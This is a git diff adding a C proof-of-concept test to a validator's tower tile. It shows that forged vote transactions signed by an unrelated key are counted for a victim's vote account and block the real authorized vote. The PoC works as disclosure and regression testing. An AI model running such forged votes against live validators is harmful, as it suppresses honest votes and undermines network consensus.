@@ -1,0 +1,148 @@
+diff --git a/src/discof/tower/test_tower_tile.c b/src/discof/tower/test_tower_tile.c
+index 942f850e9..d72f005bf 100644
+--- a/src/discof/tower/test_tower_tile.c
++++ b/src/discof/tower/test_tower_tile.c
+@@ -603,6 +603,124 @@ test_eqvoc_cre_diff( fd_wksp_t * wksp ) {
+   FD_LOG_NOTICE(( "pass: test_eqvoc_cre_diff" ));
+ }
+ 
++/* ---- vote-poisoning PoC: missing authorized voter check ----
++
++   count_vote_txn extracts the vote account from accounts[1] (1-sig tx)
++   or accounts[2] (2-sig tx) but never verifies that any transaction
++   signer is the authorized voter for that vote account.  An attacker
++   can sign a vote transaction with an arbitrary keypair while pointing
++   the vote_account field at any staked validator's vote account.  The
++   target validator's tower tile will count the stake as if it came from
++   the real authorized voter, and subsequent real votes for the same slot
++   will be rejected with ALREADY_VOTED.
++
++   Vulnerable code: src/discof/tower/fd_tower_tile.c:745-746 (TODO). */
++
++/* mock_attacker_vote_txn builds a 1-signature TowerSync transaction
++   for a single slot.  signer_key is the fee_payer and vote_authority;
++   vote_account is the vote account address (may differ from signer_key,
++   which is exactly the vulnerability). */
++static fd_txn_t const *
++mock_attacker_vote_txn( ulong               root,
++                        ulong               vote_slot,
++                        ulong               vote_conf,
++                        fd_hash_t const *   block_id,
++                        fd_pubkey_t const * signer_key,
++                        fd_pubkey_t const * vote_account,
++                        fd_txn_p_t *        txnp,
++                        uchar               txn_out[ static FD_TXN_MAX_SZ ] ) {
++  static uchar atk_tower_mem[ 65536 ] __attribute__((aligned(128)));
++  fd_tower_t * tower = fd_tower_join( fd_tower_new( atk_tower_mem, 2, 2, 0 ) );
++  tower->root = root;
++  fd_tower_vote_push_tail( tower->votes, (fd_tower_vote_t){ .slot = vote_slot, .conf = (uchar)vote_conf } );
++
++  fd_hash_t bank_hash        = {0};
++  fd_hash_t recent_blockhash = {0};
++  /* Passing signer_key as both validator_identity and vote_authority
++     causes fd_tower_to_vote_txn to emit a 1-sig transaction where
++     accs[0]=signer_key and accs[1]=vote_account.  count_vote_txn
++     picks up accs[1] as the vote account (line 792) without checking
++     that accs[0] is authorized to vote for it. */
++  fd_tower_to_vote_txn( tower, &bank_hash, block_id, &recent_blockhash,
++                        signer_key, signer_key, vote_account, txnp );
++  FD_TEST( txnp->payload_sz && txnp->payload_sz<=FD_TPU_MTU );
++  FD_TEST( fd_txn_parse_core( txnp->payload, txnp->payload_sz, txn_out, NULL, NULL ) );
++  return (fd_txn_t const *)txn_out;
++}
++
++static void
++test_vote_poisoning_auth_voter_bypass( fd_wksp_t * wksp ) {
++
++  /* Bootstrap a full choreo context with fixture data so that ghost,
++     tower, hfork, and votes are all properly initialized. */
++  fd_tower_tile_t * ctx = eqvoc_setup( wksp );
++  ulong root_slot = ctx->tower->root;
++  FD_TEST( root_slot != ULONG_MAX );
++
++  /* Victim: a staked validator.  Attacker knows only the vote account
++     public key (published on-chain) and no private keys. */
++  fd_pubkey_t victim_vote_acc = { .ul = { 0xBEEF, 0, 0, 0 } };
++  fd_pubkey_t victim_auth_key = { .ul = { 0x5AFE, 0, 0, 0 } }; /* real authorized voter */
++  fd_pubkey_t attacker_key    = { .ul = { 0xBAD1, 0, 0, 0 } }; /* unrelated attacker keypair */
++  ulong       victim_stake    = 1000000UL;
++
++  /* vote_slot is within the votes window: > tower root, < votes->root + slot_max. */
++  ulong     attack_slot = EQVOC_START_SLOT + 20UL;
++  fd_hash_t block_id    = { .ul = { 0xFAB1 } };
++
++  /* Register victim_vote_acc as staked in all structures that
++     count_vote_txn consults. */
++
++  /* 1. stk_vtr_map: stake lookup at fd_tower_tile.c:814-816. */
++  fd_tower_stakes_insert( ctx->tower, root_slot, &victim_vote_acc, victim_stake, ULONG_MAX );
++
++  /* 2. votes vtr_map: required by fd_votes_count_vote at line 824. */
++  ulong vtr_stakes[1] = { victim_stake };
++  fd_votes_update_voters( ctx->votes, &victim_vote_acc, vtr_stakes, 1UL );
++
++  /* 3. Ghost root total_stake: used by publish_slot_confirmed. */
++  fd_ghost_root( ctx->ghost )->total_stake = victim_stake * 2UL;
++
++  /* === STEP 1: Attacker sends a fake vote ===
++     The transaction is signed by attacker_key (accs[0]) but references
++     victim_vote_acc (accs[1]).  count_vote_txn uses accs[1] as
++     vote_acc without verifying accs[0] is the authorized voter. */
++  fd_txn_p_t      atk_txnp[1];
++  uchar           atk_txn_buf[ FD_TXN_MAX_SZ ] __attribute__((aligned(alignof(fd_txn_t))));
++  fd_txn_t const *atk_txn = mock_attacker_vote_txn(
++      root_slot, attack_slot, 1U, &block_id,
++      &attacker_key, &victim_vote_acc, atk_txnp, atk_txn_buf );
++
++  memset( &ctx->metrics, 0, sizeof(ctx->metrics) );
++  count_vote_txn( ctx, atk_txn, atk_txnp->payload );
++
++  /* Attacker's fake vote is accepted: no error metrics, no ALREADY_VOTED. */
++  FD_TEST( ctx->metrics.txn_bad_tower     == 0UL );
++  FD_TEST( ctx->metrics.votes_unknown_vtr == 0UL );
++  FD_TEST( ctx->metrics.votes_already_voted == 0UL );
++
++  /* === STEP 2: Real vote from the authorized voter is blocked ===
++     Same slot, same block_id, same vote_account - only the signer differs.
++     fd_votes_count_vote sees victim_vote_acc's bit already set for
++     attack_slot and returns FD_VOTES_ERR_ALREADY_VOTED. */
++  fd_txn_p_t      real_txnp[1];
++  uchar           real_txn_buf[ FD_TXN_MAX_SZ ] __attribute__((aligned(alignof(fd_txn_t))));
++  fd_txn_t const *real_txn = mock_attacker_vote_txn(
++      root_slot, attack_slot, 1U, &block_id,
++      &victim_auth_key, &victim_vote_acc, real_txnp, real_txn_buf );
++
++  memset( &ctx->metrics, 0, sizeof(ctx->metrics) );
++  count_vote_txn( ctx, real_txn, real_txnp->payload );
++
++  /* Real vote is rejected: fake vote permanently displaced it. */
++  FD_TEST( ctx->metrics.votes_already_voted == 1UL );
++
++  FD_LOG_NOTICE(( "PASS: vote-poisoning - attacker_key=%08lx voted for victim_vote_acc=%08lx "
++                  "at slot %lu; real vote by victim_auth_key=%08lx rejected ALREADY_VOTED",
++                  attacker_key.ul[0], victim_vote_acc.ul[0], attack_slot,
++                  victim_auth_key.ul[0] ));
++}
++
+ int
+ main( int     argc,
+       char ** argv ) {
+@@ -610,8 +728,8 @@ main( int     argc,
+ 
+   test_count_vote_txn();
+ 
+-  ulong       page_cnt = 4;
+-  char *      page_sz  = "gigantic";
++  ulong       page_cnt = 2048; /* 2048 x 2 MiB = 4 GiB; gigantic pages not available on WSL2 */
++  char *      page_sz  = "huge";
+   ulong       numa_idx = fd_shmem_numa_idx( 0 );
+   fd_wksp_t * wksp     = fd_wksp_new_anonymous( fd_cstr_to_shmem_page_sz( page_sz ), page_cnt, fd_shmem_cpu_idx( numa_idx ), "wksp", 0UL );
+   FD_TEST( wksp );
+@@ -624,6 +742,7 @@ main( int     argc,
+   fd_wksp_reset( wksp, 1UL ); test_eqvoc_rce_diff( wksp );
+   fd_wksp_reset( wksp, 1UL ); test_eqvoc_erc_diff( wksp );
+   fd_wksp_reset( wksp, 1UL ); test_eqvoc_cre_diff( wksp );
++  fd_wksp_reset( wksp, 1UL ); test_vote_poisoning_auth_voter_bypass( wksp );
+ 
+   fd_halt();
+ }
